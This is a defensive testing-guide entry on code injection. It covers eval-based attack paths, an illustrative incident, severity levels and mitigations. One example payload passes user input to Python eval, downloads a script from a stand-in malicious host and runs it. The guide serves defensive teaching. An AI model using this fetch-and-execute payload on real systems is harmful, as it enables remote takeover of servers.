**WSTG-INPV-11**

Test Name----\> Testing for Code Injection

Objectives---\> \- Identify injection points where you can inject code into the application.

\- Assess the injection severity.

**Overview-**

Code Injection occurs when an attacker is able to insert and execute arbitrary code within the context of a vulnerable application. Unlike SQL injection or XSS which are scoped to database queries or browser scripts, code injection directly targets the application’s execution environment—like the underlying OS, language interpreter (Python, PHP, etc.), or shell.

This vulnerability typically arises when user-supplied input is directly passed into functions that evaluate code (e.g., eval(), exec(), system(), popen(), etc.) without adequate sanitization. If exploited, attackers can execute system commands, read sensitive files, escalate privileges, or gain full control over the server.

Code injection is dangerous because it doesn't just manipulate logic—it **runs the attacker's code** within the trusted environment of the app, potentially bypassing all authentication, access control, and integrity mechanisms.

**Real World Example-**

**The Incident:**  
A financial analytics tool allowed premium users to create custom formulas using a web interface. These formulas were passed to a Python backend and evaluated using the eval() function.

A user submitted the following as their "custom formula":

\_\_import\_\_('os').system('curl http://malicious.site/shell.sh | sh')

Instead of a financial formula, this payload executed a shell script from a remote server. The application blindly passed the formula to eval(), resulting in:

eval("\_\_import\_\_('os').system('curl http://malicious.site/shell.sh | sh')")

**What Went Wrong:**

* The application trusted user input and executed it within the Python interpreter.  
* It lacked sandboxing or validation for the “formula” inputs.  
* The attacker remotely executed a reverse shell and gained persistent access to the server.

This classic case of command/code injection resulted in full server compromise, data exfiltration, and massive regulatory liabilities due to sensitive financial data exposure.

**How the Vulnerability occurs-**

Code injection typically stems from one or more of the following design flaws:

* **Dynamic execution functions** (eval, exec, popen, system, shell\_exec) receiving unsanitized user input.

* **Templating engines** that process user data insecurely (e.g., Jinja2 with autoescape disabled).

* **Insecure deserialization** mechanisms that parse user data and reconstruct code objects or class instances.

* **Scripting interfaces or plugins** where user-supplied code is treated as trusted input.

* **Misconfigured language interpreters or wrappers** that execute arbitrary scripts from input parameters.

**Common injection vectors include:**

* URL parameters

* Form fields

* Headers

* Query strings

* API payloads

* Environment variables

**Severity spectrum:**

* Low: Denial of service via infinite loops or recursion.

* Medium: Access to local files or limited shell commands.

* High: Full remote code execution (RCE) with privilege escalation.

**Secure Coding Recommendations-**

  **Avoid dynamic execution:** Eliminate the use of dangerous functions like eval(), exec(), popen() unless absolutely necessary.

  **Use safe interpreters or sandboxes:** For user-submitted code (e.g., in coding platforms), execute within isolated, resource-constrained containers.

  **Sanitize and validate input strictly:** Apply strict input validation (whitelisting, type enforcement, max length).

  **Use parameterized APIs:** Don’t build system or interpreter commands by string concatenation—use high-level safe APIs wherever possible.

  **Disable or limit risky interpreter features:** If using languages like Python, restrict \_\_import\_\_, file access, and system command execution.

  **Enable least privilege:** Ensure the app runs with the minimal OS and application-level permissions.

  **Perform static code analysis:** Use security linters and SAST tools that detect insecure function use.

  **Log and alert unusual activity:** Monitor for suspicious command patterns or outbound traffic to strange domains.

**Mitigation Steps (Developer Focused)-**

  **Eliminate Dangerous Functions:**

* Avoid using functions like eval(), exec(), shell\_exec(), popen(), system() altogether.  
* If needed, scope them tightly to internal, hardcoded inputs.

  **Use Parameterized Libraries:**

* Instead of shell commands, use native APIs or libraries (e.g., use Python's subprocess.run() with args as a list).

  **Input Validation and Whitelisting:**

* Enforce strict format, type, and length checks on inputs.  
* Reject inputs containing special characters (e.g., ; | & \\ $ () \<\>\`) unless explicitly required.

  **Use Execution Sandboxing:**

* Run user-generated code in isolated environments (e.g., Docker containers with limited access).  
* Set resource limits (CPU, memory) to prevent abuse.

  **Secure Configuration and Logging:**

* Disable unnecessary system features.  
* Audit logs for anomalies like unexpected command executions or new user creation.

  **Security Testing:**

* Include code injection in security test plans and penetration testing scope.  
* Use tools like [CodeQL](https://securitylab.github.com/tools/codeql/) or [Bandit](https://bandit.readthedocs.io/) to detect dangerous code patterns.

